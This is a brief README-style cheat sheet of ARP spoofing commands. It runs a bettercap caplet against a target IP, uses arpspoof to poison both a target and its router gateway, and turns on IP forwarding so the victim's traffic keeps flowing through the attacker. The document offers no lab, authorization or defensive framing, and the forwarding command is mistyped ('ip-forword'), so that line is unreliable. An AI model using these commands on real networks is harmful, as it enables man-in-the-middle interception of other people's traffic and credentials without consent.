# spoofing-tip-s-and-command
# ARP Spoof using Bettercap
to run the spoof.cap file you need to add only target ip 
then run this command 
# bettercap -iface eth0 -caplet spoof.cap


# arp spoofing
# arpspoof -i eth0 -t target-ip  router-gateway-ip
# arpspoof -i eth0 -t router-gateway-ip  target-ip

in case internet is not working use this command

# echo 1>/proc/sys/net/ipv4/ip-forword
